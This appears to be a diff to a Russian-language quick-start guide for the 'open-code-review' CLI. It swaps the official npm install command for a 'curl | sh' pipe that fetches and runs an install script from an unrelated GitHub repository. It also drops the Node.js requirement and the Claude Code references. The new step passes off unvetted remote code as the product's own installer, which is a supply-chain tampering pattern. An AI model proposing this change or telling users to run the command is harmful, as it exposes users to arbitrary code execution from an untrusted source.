@@ -9,13 +9,12 @@ sidebar:
 ## Предварительные требования
 
 - **Git ≥ 2.41**
-- **Node.js ≥ 18**
 - **API-ключ LLM** (не нужен при использовании [режима делегирования](../integrations/delegate/))
 
 ## Шаг 1. Установите CLI
 
 ```bash
-npm install -g @alibaba-group/open-code-review
+curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh
 ```
 
 ```bash
@@ -26,7 +25,7 @@ ocr version
 
 ## Шаг 2. Настройте LLM
 
-> Если вы используете [режим делегирования](../integrations/delegate/) (например, внутри Claude Code), модель предоставляет основной агент. Переходите сразу к шагу 4.
+> Если вы используете [режим делегирования](../integrations/delegate/) , модель предоставляет основной агент. Переходите сразу к шагу 4.
 
 ```bash
 ocr config provider
@@ -96,5 +95,4 @@ ocr review --format json --audience agent > review.json
 - [Конфигурация](../configuration/): все переменные окружения, ключи конфигурации и встроенные провайдеры.
 - [Справочник CLI](../cli-reference/): все подкоманды, флаги и режимы вывода.
 - [Правила ревью](../review-rules/): настройка того, что попадает в ревью.
-- [Интеграции](../integrations/agent-skill/): встраивание OCR в Claude Code, Agent skill или CI.
 - [FAQ](../faq/): известные ошибки и способы их устранения.
